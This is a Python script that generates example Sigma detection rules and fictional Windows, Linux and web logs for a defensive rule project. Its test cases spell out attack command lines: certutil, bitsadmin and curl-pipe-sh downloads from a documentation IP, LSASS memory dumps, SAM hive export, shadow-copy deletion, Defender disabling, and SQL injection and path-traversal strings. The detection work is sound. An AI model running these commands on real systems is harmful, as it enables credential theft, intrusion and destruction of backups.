#!/usr/bin/env python3
"""Gera as regras de exemplo (rules/) e os logs FICTÍCIOS (samples/). Ferramenta de manutenção: o resultado já vem no repositório.

As regras são ORIGINAIS (escritas para este projeto, sem copiar repositórios públicos). Os IDs do ATT&CK foram conferidos no dado oficial (v20).
Os endereços de rede usados nos logs são de documentação (RFC 5737): 192.0.2.0/24, 198.51.100.0/24 e 203.0.113.0/24."""
from __future__ import annotations

import json
import os
import random
import re
import sys
import unicodedata
import uuid
from datetime import datetime, timedelta, timezone

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
NAMESPACE = uuid.UUID("6f0c7e0a-5d7e-4c2e-9d3a-7a1d0f5b2c11")          # ids estáveis: o mesmo título sempre gera o mesmo UUID
AUTHOR = "RuleForge (regras de exemplo)"
DATE = "2026/10/23"
PS = ["\\powershell.exe", "\\pwsh.exe"]
NET = ["\\net.exe", "\\net1.exe"]
SHELLS = ["\\cmd.exe", "\\powershell.exe", "\\pwsh.exe", "\\wscript.exe", "\\cscript.exe", "\\mshta.exe"]


def ref(tid: str) -> str:
    return "https://attack.mitre.org/techniques/" + tid.replace(".", "/") + "/"


# ---- emissor de YAML simples --------------------------------------------------------------------------------------------------------
def q(s: str) -> str:
    return "'" + s.replace("'", "''") + "'"


def scalar(v) -> str:
    if v is None:
        return "null"
    if isinstance(v, bool):
        return "true" if v else "false"
    if isinstance(v, (int, float)):
        return str(v)
    return q(str(v))


def key(k: str) -> str:
    return k if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_.|\-]*", k) else q(k)


def flow(d: dict) -> str:
    return "{" + ", ".join(f"{key(k)}: {scalar(v)}" for k, v in d.items()) + "}"


def emit(obj, indent: int = 0, flow_maps: bool = False) -> list:
    pad = " " * indent
    out = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, (dict, list)) and v:
                out.append(f"{pad}{key(k)}:")
                out += emit(v, indent + 4, flow_maps or k in ("positive", "negative"))
            elif isinstance(v, (dict, list)):
                out.append(f"{pad}{key(k)}: {{}}" if isinstance(v, dict) else f"{pad}{key(k)}: []")
            else:
                out.append(f"{pad}{key(k)}: {scalar(v)}")
    else:
        for item in obj:
            if isinstance(item, dict):
                if flow_maps and all(not isinstance(v, (dict, list)) for v in item.values()):
                    out.append(f"{pad}- {flow(item)}")
                else:
                    sub = emit(item, indent + 2, flow_maps)
                    out.append(f"{pad}- {sub[0].lstrip()}")
                    out += sub[1:]
            elif isinstance(item, list):
                out += [f"{pad}-"] + emit(item, indent + 2, flow_maps)
            else:
                out.append(f"{pad}- {scalar(item)}")
    return out


def rule_text(r: dict) -> str:
    order = ["title", "id", "name", "status", "description", "references", "author", "date", "tags", "logsource", "detection", "correlation", "falsepositives", "level", "x_tests"]
    body = {k: r[k] for k in order if k in r}
    return "\n".join(emit(body)) + "\n"


def make(title, desc, tags, logsource, detection, level, fps, positive, negative, tech, name=None, status="stable"):
    return {"title": title, "id": str(uuid.uuid5(NAMESPACE, title)), **({"name": name} if name else {}), "status": status, "description": desc,
            "references": [ref(t) for t in tech], "author": AUTHOR, "date": DATE, "tags": tags, "logsource": logsource, "detection": detection,
            "falsepositives": fps, "level": level, "x_tests": {"positive": positive, "negative": negative}}


W = {"category": "process_creation", "product": "windows"}
L = {"category": "process_creation", "product": "linux"}
SEC = {"product": "windows", "service": "security"}


def rules() -> list:
    R = []
    A = R.append
    A(make("PowerShell com comando codificado", "Detecta o PowerShell iniciado com um comando em base64 (-enc), técnica comum para esconder o que será executado.",
           ["attack.execution", "attack.t1059.001"], W,
           {"selection": {"Image|endswith": PS, "CommandLine|windash|contains": [" -enc", " -encodedcommand", " -ec "]}, "condition": "selection"}, "high",
           ["Ferramentas de administração e de implantação que usam -EncodedCommand"],
           [{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"},
            {"Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh -EncodedCommand dwBoAG8AYQBtAGkA"}],
           [{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1"},
            {"Image": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe notas -enc.txt"}], ["T1059.001"]))
    A(make("Certutil baixando arquivo da internet", "O certutil é uma ferramenta de certificados, mas também baixa arquivos (-urlcache). É usado para trazer ferramentas ao alvo.",
           ["attack.command_and_control", "attack.t1105"], W,
           {"selection": {"Image|endswith": "\\certutil.exe", "CommandLine|contains|all": ["urlcache", "http"]}, "condition": "selection"}, "high",
           ["Raro em ambientes de TI; administradores podem baixar certificados"],
           [{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.5/x.exe x.exe"}],
           [{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -viewstore My"}], ["T1105"]))
    A(make("Mshta executando conteúdo remoto ou em linha", "O mshta executa aplicações HTML e aceita URLs e código em linha: uma forma de rodar código sem arquivo no disco.",
           ["attack.stealth", "attack.t1218.005"], W,
           {"selection": {"Image|endswith": "\\mshta.exe", "CommandLine|contains": ["http://", "https://", "javascript:", "vbscript:"]}, "condition": "selection"}, "high",
           ["Aplicações legadas que usam arquivos .hta locais (não casam, pois não têm URL)"],
           [{"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe https://exemplo.invalid/a.hta"},
            {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta vbscript:Execute(\"x\")"}],
           [{"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe C:\\apps\\legado.hta"}], ["T1218.005"]))
    A(make("Rundll32 gerando dump de memória (comsvcs MiniDump)", "O comsvcs.dll tem uma função (MiniDump) usada para copiar a memória de um processo, inclusive do LSASS, onde ficam credenciais.",
           ["attack.credential_access", "attack.t1003.001"], W,
           {"selection": {"Image|endswith": "\\rundll32.exe", "CommandLine|contains|all": ["comsvcs", "minidump"]}, "condition": "selection"}, "critical",
           ["Praticamente nenhum uso legítimo"],
           [{"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"}],
           [{"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL"}], ["T1003.001"]))
    A(make("Procdump acessando o LSASS", "O procdump é uma ferramenta legítima, mas apontada para o lsass.exe serve para roubar credenciais da memória.",
           ["attack.credential_access", "attack.t1003.001"], W,
           {"tool": {"Image|endswith": ["\\procdump.exe", "\\procdump64.exe"]}, "target": {"CommandLine|contains": "lsass"}, "condition": "tool and target"}, "high",
           ["Equipes de suporte que analisam travamentos (devem ser exceção documentada)"],
           [{"Image": "C:\\Tools\\procdump64.exe", "CommandLine": "procdump64.exe -accepteula -ma lsass.exe l.dmp"}],
           [{"Image": "C:\\Tools\\procdump64.exe", "CommandLine": "procdump64.exe -ma app.exe app.dmp"}], ["T1003.001"]))
    A(make("Reg.exe salvando hives de credenciais (SAM, SECURITY)", "Salvar as hives SAM ou SECURITY do registro permite quebrar as senhas locais fora da máquina.",
           ["attack.credential_access", "attack.t1003.002"], W,
           {"tool": {"Image|endswith": "\\reg.exe", "CommandLine|contains": " save "}, "hive": {"CommandLine|contains": ["hklm\\sam", "hklm\\security"]}, "condition": "tool and hive"}, "high",
           ["Cópias de segurança de configuração (raras para SAM e SECURITY)"],
           [{"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg.exe save HKLM\\SAM C:\\temp\\sam.save"}],
           [{"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg.exe save HKCU\\Software\\App C:\\temp\\app.reg"}], ["T1003.002"]))
    A(make("Remoção das cópias de sombra (backups do Windows)", "Ransomware apaga as cópias de sombra para impedir a recuperação dos arquivos.",
           ["attack.impact", "attack.t1490"], W,
           {"selection_vss": {"Image|endswith": "\\vssadmin.exe", "CommandLine|contains|all": ["delete", "shadows"]},
            "selection_wmic": {"Image|endswith": "\\wmic.exe", "CommandLine|contains|all": ["shadowcopy", "delete"]}, "condition": "1 of selection_*"}, "critical",
           ["Rotinas de limpeza de armazenamento (devem ser conhecidas)"],
           [{"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet"},
            {"Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "wmic shadowcopy delete"}],
           [{"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe list shadows"}], ["T1490"]))
    A(make("Limpeza dos logs de eventos do Windows", "Apagar os logs de eventos com o wevtutil esconde a atividade do atacante.",
           ["attack.defense_impairment", "attack.t1685.005"], W,
           {"selection": {"Image|endswith": "\\wevtutil.exe", "CommandLine|contains": [" cl ", " clear-log "]}, "condition": "selection"}, "high",
           ["Processos de manutenção de logs (devem ser conhecidos)"],
           [{"Image": "C:\\Windows\\System32\\wevtutil.exe", "CommandLine": "wevtutil.exe cl Security"}],
           [{"Image": "C:\\Windows\\System32\\wevtutil.exe", "CommandLine": "wevtutil.exe qe Security /c:5"}], ["T1685.005"]))
    A(make("PowerShell desativando ou enfraquecendo o Defender", "Alterar a proteção em tempo real ou criar exclusões no Defender abre caminho para executar malware sem ser visto.",
           ["attack.defense_impairment", "attack.t1685"], W,
           {"cmdlet": {"Image|endswith": PS, "CommandLine|contains": ["set-mppreference", "add-mppreference"]},
            "option": {"CommandLine|contains": ["disablerealtimemonitoring", "-exclusionpath", "disablebehaviormonitoring", "-exclusionextension"]}, "condition": "cmdlet and option"}, "high",
           ["Administradores configurando exclusões para aplicações corporativas"],
           [{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell Set-MpPreference -DisableRealtimeMonitoring $true"},
            {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell Add-MpPreference -ExclusionPath C:\\Users\\Public"}],
           [{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell Get-MpPreference"}], ["T1685"]))
    A(make("Criação de tarefa agendada", "Tarefas agendadas são uma forma comum de manter acesso e de executar código com privilégios.",
           ["attack.persistence", "attack.t1053.005"], W,
           {"selection": {"Image|endswith": "\\schtasks.exe", "CommandLine|windash|contains": " /create "}, "filter_installers": {"ParentImage|endswith": "\\msiexec.exe"},
            "condition": "selection and not filter_installers"}, "medium",
           ["Instaladores e softwares de gerenciamento", "Rotinas de TI"],
           [{"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn Atualiza /tr C:\\temp\\a.exe /sc minute", "ParentImage": "C:\\Windows\\System32\\cmd.exe"}],
           [{"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn Setup /tr C:\\app\\s.exe", "ParentImage": "C:\\Windows\\System32\\msiexec.exe"},
            {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /query"}], ["T1053.005"]))
    A(make("Criação de serviço do Windows com sc.exe", "Criar um serviço aponta um programa para iniciar com o sistema: persistência e, muitas vezes, elevação de privilégio.",
           ["attack.persistence", "attack.t1543.003"], W,
           {"selection": {"Image|endswith": "\\sc.exe", "CommandLine|contains|all": [" create ", "binpath="]}, "condition": "selection"}, "medium",
           ["Instaladores de software"],
           [{"Image": "C:\\Windows\\System32\\sc.exe", "CommandLine": "sc.exe create Atualizador binPath= C:\\temp\\svc.exe start= auto"}],
           [{"Image": "C:\\Windows\\System32\\sc.exe", "CommandLine": "sc.exe query spooler"}], ["T1543.003"]))
    A(make("Chave Run do registro para iniciar programa no logon", "Uma entrada em CurrentVersion\\Run faz o programa rodar sempre que o usuário entra: persistência simples e comum.",
           ["attack.persistence", "attack.t1547.001"], W,
           {"selection": {"Image|endswith": "\\reg.exe", "CommandLine|contains|all": [" add ", "\\currentversion\\run"]}, "condition": "selection"}, "medium",
           ["Instaladores de software"],
           [{"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d C:\\temp\\a.exe"}],
           [{"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"}], ["T1547.001"]))
    A(make("Criação de conta local com net user /add", "Uma conta local nova pode ser uma porta dos fundos para voltar ao sistema.",
           ["attack.persistence", "attack.t1136.001"], W,
           {"selection": {"Image|endswith": NET, "CommandLine|contains|all": [" user ", " /add"]}, "condition": "selection"}, "high",
           ["Rotinas de provisionamento de máquinas"],
           [{"Image": "C:\\Windows\\System32\\net1.exe", "CommandLine": "net1 user suporte$ Senha123 /add"}],
           [{"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net user ana"}], ["T1136.001"]))
    A(make("Consulta aos grupos de administradores do domínio", "Descobrir quem são os administradores do domínio é um passo típico de reconhecimento antes do movimento lateral.",
           ["attack.discovery", "attack.t1069.002"], W,
           {"selection": {"Image|endswith": NET, "CommandLine|contains|all": [" group ", "admins", "/domain"]}, "condition": "selection"}, "medium",
           ["Administradores do Active Directory"],
           [{"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net group \"Domain Admins\" /domain"}],
           [{"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net group Vendas /domain"}], ["T1069.002"]))
    A(make("Whoami com parâmetros de reconhecimento", "O whoami /priv ou /all mostra privilégios e grupos do usuário: reconhecimento comum após o primeiro acesso.",
           ["attack.discovery", "attack.t1033"], W,
           {"selection": {"Image|endswith": "\\whoami.exe", "CommandLine|windash|contains": [" /priv", " /all", " /groups"]}, "condition": "selection"}, "low",
           ["Suporte técnico e administradores (muito comum)"],
           [{"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /priv"}],
           [{"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami"}], ["T1033"], status="test"))
    A(make("WMIC criando processo", "O wmic pode iniciar programas (inclusive em outras máquinas), o que já foi usado para execução e movimento lateral.",
           ["attack.execution", "attack.t1047"], W,
           {"selection": {"Image|endswith": "\\wmic.exe", "CommandLine|contains|all": ["process", "call", "create"]}, "condition": "selection"}, "medium",
           ["Scripts de administração antigos"],
           [{"Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "wmic /node:srv01 process call create \"cmd /c calc\""}],
           [{"Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "wmic process list brief"}], ["T1047"]))
    A(make("Aplicativo do Office iniciando interpretador de comandos", "Word, Excel e similares não deveriam iniciar um shell. É o comportamento típico de um documento malicioso (macro).",
           ["attack.execution", "attack.t1204.002"], W,
           {"parent": {"ParentImage|endswith": ["\\winword.exe", "\\excel.exe", "\\powerpnt.exe", "\\outlook.exe"]}, "child": {"Image|endswith": SHELLS}, "condition": "parent and child"}, "high",
           ["Macros legítimas de automação (devem ser exceção documentada)"],
           [{"ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "Image": "C:\\Windows\\System32\\cmd.exe"},
            {"ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}],
           [{"ParentImage": "C:\\Windows\\explorer.exe", "Image": "C:\\Windows\\System32\\cmd.exe"},
            {"ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\ADDINS\\x.exe"}], ["T1204.002"]))
    A(make("Bitsadmin baixando arquivos", "O BITS Admin transfere arquivos em segundo plano e pode ser usado para baixar e manter código no sistema.",
           ["attack.stealth", "attack.persistence", "attack.t1197"], W,
           {"selection": {"Image|endswith": "\\bitsadmin.exe", "CommandLine|windash|contains": " /transfer"}, "condition": "selection"}, "medium",
           ["Ferramentas de atualização que usam o BITS"],
           [{"Image": "C:\\Windows\\System32\\bitsadmin.exe", "CommandLine": "bitsadmin /transfer j http://203.0.113.5/a.exe C:\\temp\\a.exe"}],
           [{"Image": "C:\\Windows\\System32\\bitsadmin.exe", "CommandLine": "bitsadmin /list"}], ["T1197"]))
    A(make("Regsvr32 carregando scriptlet remoto", "O regsvr32 com scrobj.dll ou uma URL executa código remoto sem gravar arquivo: um desvio clássico de controles de aplicativos.",
           ["attack.stealth", "attack.t1218.010"], W,
           {"selection": {"Image|endswith": "\\regsvr32.exe", "CommandLine|contains": ["/i:http", "scrobj.dll"]}, "condition": "selection"}, "high",
           ["Praticamente nenhum uso legítimo com URL"],
           [{"Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32 /s /n /u /i:http://203.0.113.5/x.sct scrobj.dll"}],
           [{"Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32 /s C:\\app\\componente.dll"}], ["T1218.010"]))
    A(make("Servidor web iniciando um interpretador de comandos", "Um servidor web que abre cmd ou PowerShell é o sinal típico de um web shell em atividade.",
           ["attack.persistence", "attack.t1505.003"], W,
           {"parent": {"ParentImage|endswith": ["\\w3wp.exe", "\\httpd.exe", "\\nginx.exe"]}, "child": {"Image|endswith": ["\\cmd.exe", "\\powershell.exe", "\\pwsh.exe"]}, "condition": "parent and child"}, "critical",
           ["Aplicações web que executam scripts de manutenção (raro)"],
           [{"ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe", "Image": "C:\\Windows\\System32\\cmd.exe"}],
           [{"ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe", "Image": "C:\\Windows\\System32\\inetsrv\\appcmd.exe"}], ["T1505.003"]))
    # ---- Windows: autenticação (regra-base e correlações) ----
    A(make("Falha de logon no Windows", "Base para as regras de correlação de força bruta e de password spraying. Sozinha não gera alerta.",
           ["attack.credential_access", "attack.t1110"], SEC, {"selection": {"EventID": 4625}, "condition": "selection"}, "low",
           ["Usuários que erram a senha"],
           [{"EventID": 4625, "TargetUserName": "ana", "IpAddress": "10.0.4.12"}], [{"EventID": 4624, "TargetUserName": "ana", "IpAddress": "10.0.4.12"}], ["T1110"], name="win_failed_logon"))
    return R


def correlations() -> list:
    def corr(title, desc, tags, ctype, group, span, cond, level, fps, positive, negative, tech):
        r = {"title": title, "id": str(uuid.uuid5(NAMESPACE, title)), "status": "stable", "description": desc, "references": [ref(t) for t in tech], "author": AUTHOR,
             "date": DATE, "tags": tags, "correlation": {"type": ctype, "rules": ["win_failed_logon" if "Windows" in title else "lnx_ssh_failed_password"], "group-by": group, "timespan": span,
                                                         "condition": cond}, "falsepositives": fps, "level": level, "x_tests": {"positive": positive, "negative": negative}}
        return r
    t0 = "2026-10-22T08:00:{:02d}Z"
    fails = [{"timestamp": t0.format(i * 2), "EventID": 4625, "TargetUserName": "administrator", "IpAddress": "203.0.113.50"} for i in range(10)]
    few = fails[:4]
    spread = [{"timestamp": "2026-10-22T08:00:{:02d}Z".format(i * 5), "EventID": 4625, "TargetUserName": f"user{i}", "IpAddress": "198.51.100.77"} for i in range(8)]
    out = [
        corr("Muitas falhas de logon no Windows vindas do mesmo endereço", "Dez ou mais falhas de logon em 5 minutos, do mesmo endereço de origem: força bruta contra uma ou mais contas.",
             ["attack.credential_access", "attack.t1110.001"], "event_count", ["IpAddress"], "5m", {"gte": 10}, "high", ["Aplicação com senha antiga salva, tentando repetidamente"],
             [{"events": fails}], [{"events": few}], ["T1110.001"]),
        corr("Password spraying no Windows: várias contas, mesmo endereço", "Oito ou mais contas diferentes com falha de logon, do mesmo endereço, em 10 minutos: uma senha comum tentada em muitas contas.",
             ["attack.credential_access", "attack.t1110.003"], "value_count", ["IpAddress"], "10m", {"gte": 8, "field": "TargetUserName"}, "high", ["Testes de segurança autorizados"],
             [{"events": spread}], [{"events": spread[:5]}, {"events": fails}], ["T1110.003"]),
    ]
    return out


def linux_rules() -> list:
    R = []
    A = R.append
    A(make("Falha de login SSH no Linux", "Base para a correlação de força bruta contra o SSH. Sozinha não gera alerta.", ["attack.credential_access", "attack.t1110.001"],
           {"product": "linux", "service": "auth"}, {"selection": {"program": "sshd", "message|contains": "failed password"}, "condition": "selection"}, "low",
           ["Usuários que erram a senha"],
           [{"program": "sshd", "message": "Failed password for root from 192.0.2.99 port 5555 ssh2", "src_ip": "192.0.2.99"}],
           [{"program": "sshd", "message": "Accepted password for ana from 10.0.4.12 port 5555 ssh2"}, {"program": "sudo", "message": "Failed password for ana"}], ["T1110.001"], name="lnx_ssh_failed_password"))
    A(make("Criação de usuário no Linux", "Criar contas com useradd ou adduser pode ser persistência.", ["attack.persistence", "attack.t1136.001"], L,
           {"selection": {"Image|endswith": ["/useradd", "/adduser"]}, "condition": "selection"}, "medium", ["Provisionamento de servidores"],
           [{"Image": "/usr/sbin/useradd", "CommandLine": "useradd -m suporte"}], [{"Image": "/usr/bin/id", "CommandLine": "id ana"}], ["T1136.001"]))
    A(make("Download executado direto no shell (curl ou wget em pipe)", "Baixar um script e entregá-lo ao shell na mesma linha executa código sem deixar arquivo para inspeção.",
           ["attack.execution", "attack.t1059.004"], L,
           {"selection": {"CommandLine|re": "(curl|wget)\\s+[^|]*\\|\\s*(ba|z)?sh\\b"}, "condition": "selection"}, "high", ["Instaladores que recomendam esse formato (devem ser revisados)"],
           [{"Image": "/usr/bin/bash", "CommandLine": "curl -s http://203.0.113.5/i.sh | sh"}, {"Image": "/usr/bin/bash", "CommandLine": "wget -qO- http://203.0.113.5/i.sh | bash"}],
           [{"Image": "/usr/bin/curl", "CommandLine": "curl -s http://exemplo.invalid/status"}, {"Image": "/usr/bin/bash", "CommandLine": "curl -s http://exemplo.invalid/a.json | jq ."}], ["T1059.004"]))
    A(make("Arquivo criado nas pastas do cron", "Agendar tarefas pelo cron é persistência clássica no Linux.", ["attack.persistence", "attack.t1053.003"], {"category": "file_event", "product": "linux"},
           {"selection": {"TargetFilename|startswith": ["/etc/cron.d/", "/var/spool/cron/"]}, "filter_packages": {"Image|endswith": ["/dpkg", "/rpm", "/apt", "/yum"]},
            "condition": "selection and not filter_packages"}, "medium", ["Instalação de pacotes e rotinas de TI"],
           [{"Image": "/usr/bin/vim", "TargetFilename": "/etc/cron.d/atualiza"}], [{"Image": "/usr/bin/dpkg", "TargetFilename": "/etc/cron.d/logrotate"}, {"Image": "/usr/bin/vim", "TargetFilename": "/etc/hosts"}],
           ["T1053.003"]))
    return R


def web_rules() -> list:
    WS = {"category": "webserver"}
    R = []
    A = R.append
    A(make("Tentativa de injeção de SQL na requisição web", "A requisição traz padrões típicos de injeção de SQL (UNION SELECT, information_schema, sleep).", ["attack.initial_access", "attack.t1190"], WS,
           {"selection": {"cs-uri-query|contains": ["union select", "union%20select", "information_schema", "sleep(", " or 1=1", "%20or%201=1"]}, "condition": "selection"}, "high",
           ["Ferramentas de teste de segurança autorizadas"],
           [{"cs-uri-query": "id=1 UNION SELECT user,pass FROM users", "c-ip": "203.0.113.9"}, {"cs-uri-query": "q=a%27%20or%201=1--", "c-ip": "203.0.113.9"}],
           [{"cs-uri-query": "q=select+um+produto", "c-ip": "10.0.0.7"}], ["T1190"]))
    A(make("Varredura de vulnerabilidades por user-agent conhecido", "Ferramentas de varredura se identificam no user-agent. Indica reconhecimento do site.", ["attack.reconnaissance", "attack.t1595.002"], WS,
           {"selection": {"cs-user-agent|contains": ["sqlmap", "nikto", "masscan", "gobuster", "dirbuster", "wpscan"]}, "condition": "selection"}, "medium", ["Varreduras autorizadas do time de segurança"],
           [{"cs-user-agent": "sqlmap/1.7#stable (https://sqlmap.org)", "c-ip": "203.0.113.9"}], [{"cs-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "c-ip": "10.0.0.7"}], ["T1595.002"]))
    A(make("Tentativa de path traversal na URL", "Sequências ../ (ou codificadas) na URL tentam ler arquivos fora da pasta do site.", ["attack.initial_access", "attack.t1190"], WS,
           {"selection": {"cs-uri-stem|contains": ["../", "..%2f", "%2e%2e%2f"]}, "condition": "selection"}, "medium", ["Aplicações que montam caminhos relativos na URL (raro)"],
           [{"cs-uri-stem": "/download/../../etc/passwd", "c-ip": "203.0.113.9"}, {"cs-uri-stem": "/img/%2e%2e%2f%2e%2e%2fetc/shadow", "c-ip": "203.0.113.9"}],
           [{"cs-uri-stem": "/imagens/logo.png", "c-ip": "10.0.0.7"}], ["T1190"]))
    return R


def write_rules() -> int:
    groups = {"windows": rules(), "windows-correlacao": correlations(), "linux": linux_rules(), "web": web_rules()}
    # as regras do Linux dependem das de base: a correlação do SSH usa a regra lnx_ssh_failed_password
    ssh_events = [{"timestamp": "2026-10-22T09:15:{:02d}Z".format(i * 6), "program": "sshd", "message": "Failed password for root from 192.0.2.99 port 4000 ssh2", "src_ip": "192.0.2.99"} for i in range(8)]
    ssh = {"title": "Força bruta de SSH no Linux", "id": str(uuid.uuid5(NAMESPACE, "Força bruta de SSH no Linux")), "status": "stable",
           "description": "Oito ou mais falhas de senha no SSH, do mesmo endereço, em 2 minutos.", "references": [ref("T1110.001")], "author": AUTHOR, "date": DATE,
           "tags": ["attack.credential_access", "attack.t1110.001"],
           "correlation": {"type": "event_count", "rules": ["lnx_ssh_failed_password"], "group-by": ["src_ip"], "timespan": "2m", "condition": {"gte": 8}},
           "falsepositives": ["Pessoa digitando a senha errada várias vezes (poucas falhas)"], "level": "high",
           "x_tests": {"positive": [{"events": ssh_events}], "negative": [{"events": ssh_events[:3]}]}}
    groups["linux"].append(ssh)
    total = 0
    for folder, items in groups.items():
        d = os.path.join(ROOT, "rules", folder)
        os.makedirs(d, exist_ok=True)
        for old in os.listdir(d):
            if old.endswith(".yml"):
                os.remove(os.path.join(d, old))
        for r in items:
            slug = re.sub(r"[^a-z0-9]+", "_", unicodedata.normalize("NFKD", r["title"]).encode("ascii", "ignore").decode().lower()).strip("_")[:60]
            with open(os.path.join(d, f"{slug}.yml"), "w", encoding="utf-8", newline="\n") as f:
                f.write(rule_text(r))
            total += 1
    return total


# ---- logs fictícios -----------------------------------------------------------------------------------------------------------------
BASE = datetime(2026, 10, 22, 8, 0, 0, tzinfo=timezone.utc)


def iso(sec: float) -> str:
    return (BASE + timedelta(seconds=sec)).strftime("%Y-%m-%dT%H:%M:%SZ")


def write_jsonl(name: str, events: list) -> None:
    events.sort(key=lambda e: e["timestamp"])
    os.makedirs(os.path.join(ROOT, "samples"), exist_ok=True)
    with open(os.path.join(ROOT, "samples", name), "w", encoding="utf-8", newline="\n") as f:
        for e in events:
            f.write(json.dumps(e, ensure_ascii=False) + "\n")


def write_logs() -> None:
    rnd = random.Random(20261022)
    comp = ["PC-FIN-01", "PC-VENDAS-07", "PC-RH-03", "SRV-APP-01"]
    users = ["ana", "bruno", "carla", "diego"]
    sysmon = []
    normal = [("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer", "C:\\Windows\\explorer.exe"),
              ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs", "C:\\Windows\\System32\\services.exe"),
              ("C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "EXCEL.EXE planilha.xlsx", "C:\\Windows\\explorer.exe"),
              ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -File C:\\scripts\\backup.ps1", "C:\\Windows\\System32\\svchost.exe"),
              ("C:\\Windows\\System32\\whoami.exe", "whoami", "C:\\Windows\\System32\\cmd.exe"),
              ("C:\\Windows\\System32\\schtasks.exe", "schtasks /create /tn Setup /tr C:\\app\\s.exe", "C:\\Windows\\System32\\msiexec.exe"),
              ("C:\\Windows\\System32\\reg.exe", "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "C:\\Windows\\System32\\cmd.exe"),
              ("C:\\Windows\\System32\\net.exe", "net group Vendas /domain", "C:\\Windows\\System32\\cmd.exe")]
    for i in range(220):
        img, cmd, parent = rnd.choice(normal)
        sysmon.append({"timestamp": iso(rnd.uniform(0, 3500)), "EventID": 1, "Computer": rnd.choice(comp), "User": rnd.choice(users), "Image": img, "CommandLine": cmd, "ParentImage": parent})
    attacks = [(300, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
               (320, "C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://203.0.113.5/p.exe C:\\Users\\Public\\p.exe", "C:\\Windows\\System32\\cmd.exe"),
               (340, "C:\\Windows\\System32\\mshta.exe", "mshta.exe https://exemplo.invalid/a.hta", "C:\\Windows\\explorer.exe"),
               (400, "C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 624 C:\\Users\\Public\\l.dmp full", "C:\\Windows\\System32\\cmd.exe"),
               (410, "C:\\Tools\\procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\l2.dmp", "C:\\Windows\\System32\\cmd.exe"),
               (420, "C:\\Windows\\System32\\reg.exe", "reg save HKLM\\SAM C:\\Users\\Public\\sam.save", "C:\\Windows\\System32\\cmd.exe"),
               (500, "C:\\Windows\\System32\\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "C:\\Windows\\System32\\cmd.exe"),
